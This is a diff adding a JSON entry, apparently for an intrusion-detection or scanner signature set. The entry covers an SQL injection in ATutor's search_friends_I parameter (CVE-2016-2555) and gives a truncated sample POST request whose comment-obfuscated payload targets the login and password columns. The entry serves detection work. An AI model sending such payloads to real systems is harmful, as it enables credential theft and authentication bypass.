@@ -1,0 +1,9 @@
+{
+	"Name": "Atutor search_friends_I SQL Injection",
+	"Description": "-  온라인 과정을 개발하고 e러닝 콘텐츠를 만드는 데 사용되는 무료 오픈 소스 LMS(Learning Management System)\n- search_friends_I의 인자 값이 전달될 때 검증이 누락되어 SQL 쿼리 injection가능\n- 공격자는 이를 이용하여 인증 우회 및 악의적인 코드 실행 가능",
+	"References": ["CVE-2016-2555"],
+	"Samples": [
+		"POST /ATutor/mods/_standard/social/index_public.php HTTP/1.1\nHost: 1.1.1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 218\nsearch_friends_I=dxl%27/%2a%2a/or/%2a%2a/%28select/%2a%2a/length%28concat%28login%2c0x3a%2cpassword%29%29/%2a%2a/fro"],
+	"Keywords": [],
+	"Signature": []
+}
